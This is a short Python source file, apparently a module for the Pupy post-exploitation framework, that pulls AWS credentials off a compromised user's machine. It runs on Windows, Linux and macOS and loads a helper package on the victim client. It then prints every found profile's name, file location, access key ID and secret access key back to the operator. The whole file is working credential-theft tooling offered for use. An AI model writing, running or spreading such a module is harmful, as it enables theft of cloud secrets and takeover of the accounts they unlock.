# -*- coding: UTF8 -*-
# Author: @BradErz
# Contributor(s):

from pupylib.PupyModule import *

__class_name__ = "AWSCredentials"

@config(compatibilities=['windows', 'linux', 'darwin'], category="creds")
class AWSCredentials(PupyModule):
    """Get AWS credntials from a users pc"""
    is_module = False

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="aws_credentials", description=self.__doc__)

    def run(self, args):
        self.client.load_package("aws_credentials")
        aws_creds = self.client.conn.modules['aws_credentials'].AWSCredentials()
        aws_creds.run()

        if aws_creds.creds_found:
            for item in aws_creds.creds_found:
                self.log("\n")
                self.log("-------------------------------------------")
                self.log("Profile Name: %s" % item['profile_name'])
                self.log("Location: %s" % item['location'])
                self.log("Access key ID: %s" % item['aws_access_key_id'])
                self.log("Access secret key: %s" % item['aws_secret_access_key'])
        else:
            self.log("Couldn't find anything ;(")